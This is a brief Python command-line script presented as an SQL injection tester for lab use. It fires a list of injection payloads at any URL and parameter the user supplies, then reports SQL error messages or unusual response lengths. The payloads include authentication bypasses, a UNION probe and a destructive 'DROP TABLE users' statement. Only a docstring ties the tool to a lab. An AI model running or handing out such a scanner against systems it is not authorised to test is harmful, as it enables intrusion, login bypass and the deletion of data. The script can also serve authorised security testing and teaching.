#!/usr/bin/env python3
"""SQL Injection Tester - LAB ENVIRONMENT ONLY."""

import requests
import sys

PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "1; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--",
]

def test(url, param, value='1'):
    for p in PAYLOADS:
        try:
            r = requests.get(url, params={param: p}, timeout=5)
            if 'error' in r.text.lower() and ('sql' in r.text.lower() or 'syntax' in r.text.lower()):
                print(f"[SQL ERROR] Payload: {p[:40]}...")
            elif len(r.content) > len(requests.get(url, params={param: value}).content) * 1.5:
                print(f"[POSSIBLE] Different response length: {p[:40]}...")
        except Exception as e:
            print(f"Error: {e}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python tester.py <url> <param>")
        return
    test(sys.argv[1], sys.argv[2])

if __name__ == '__main__':
    main()
